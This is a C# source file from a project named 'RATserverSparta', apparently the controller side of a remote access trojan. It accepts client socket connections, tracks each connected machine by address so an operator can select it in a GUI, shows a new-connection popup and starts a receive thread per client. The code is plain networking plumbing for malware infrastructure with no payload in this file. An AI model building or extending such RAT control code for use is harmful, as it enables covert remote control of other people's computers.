using RATserverSparta.Client;
using RATserverSparta.GUI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;


namespace RATserverSparta.Sockets
{
    public class SocketAccept
    {
        public Dictionary<string, Client.Client> ClientInstanceMap = new Dictionary<string, Client.Client>();
        public Dictionary<string, System.Net.Sockets.Socket> ClientSocketMap = new Dictionary<string, System.Net.Sockets.Socket>();
        public delegate void NewConnection(Client.Client ClientClassInstance, System.Net.Sockets.Socket client);
        public event NewConnection OnNewConnection;
        private MainGUI GUI_Instance;

        public SocketAccept(MainGUI instance)
        {
            this.GUI_Instance = instance;
            this.OnNewConnection += NewClient;
        }

        public void Accept(System.Net.Sockets.Socket Socket)
        {
            while (true)
            {
                try
                {
                    System.Net.Sockets.Socket client = Socket.Accept();
                    //Main class communication instance:
                    Client.Client ClientClassInstance = new Client.Client(GUI_Instance, client);
                    OnNewConnection.Invoke(ClientClassInstance, client);
                }
                catch
                {
                    MessageBox.Show("catch - error occured, plepase check why.");
                    break;
                }
            }
        }


        //This delegate being used as event handler at MainGUI class and At SocketAccept class
        private void NewClient(Client.Client ClientClassInstance, System.Net.Sockets.Socket client)
        {
            //Invoking the GUI Instance class which running on different Thread:
            this.GUI_Instance.Invoke((MethodInvoker)delegate
            {
                this.GUI_Instance.ClientsConnected.Text = "Connected Clients: " + this.GUI_Instance.ConnectedClients++.ToString();
            });

            //Mapping each Client RemoteEndPoint string into his Main class communication instance:
            //This is how we can choose right click on client at the GUI, and send to this specific client the things we need.
            this.ClientInstanceMap[client.RemoteEndPoint.ToString()] = ClientClassInstance;
            //Doing the same for Socket
            this.ClientSocketMap[client.RemoteEndPoint.ToString()] = client;

            //Showing new connection GUI
            new Thread(() =>
            {
                NewconnectionGUI newconnectionGUI = new NewconnectionGUI(client.RemoteEndPoint.ToString());
                newconnectionGUI.ShowDialog();
            }).Start();

            //Sending each client to his own class instance
            new Thread(() =>
            {
                ClientClassInstance.Setup();
                ClientClassInstance.Receive();
            }).Start();
        }
    }
}
